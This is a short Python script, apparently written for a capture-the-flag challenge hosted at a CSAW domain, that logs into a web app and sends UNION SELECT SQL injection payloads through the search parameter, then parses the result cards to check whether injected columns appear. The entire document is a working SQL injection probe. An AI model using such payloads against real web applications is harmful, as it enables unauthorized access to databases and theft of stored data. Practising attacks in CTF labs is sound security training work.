import requests, re, html
B='http://csale.chal.csaw.io:5000'
s=requests.Session(); s.post(B+'/login',data={'username':'pwn1','password':'pwn1pass'})
def q(p):
    r=s.get(B+'/',params={'q':p})
    rows=[]
    for m in re.finditer(r'<article class="card">(.*?)</article>', r.text, re.S):
        t=m.group(1)
        own=re.search(r'<small>(.*?)</small>', t, re.S)
        ti=re.search(r'<h3>(.*?)</h3>', t, re.S)
        de=re.search(r'<p>(.*?)</p>', t, re.S)
        rows.append((html.unescape(own.group(1)) if own else None, html.unescape(ti.group(1)) if ti else None, html.unescape(de.group(1)) if de else None))
    return ('FAILED' if 'Search failed' in r.text else 'OK'), rows, r.text
for p in ["') UNION SELECT 1,2,3,4,5,6,7 -- -", "') UNION SELECT 1,2,3,4,5,6,7/*"]:
    st,rows,_=q(p)
    print(repr(p), st, rows[:3])
EOF
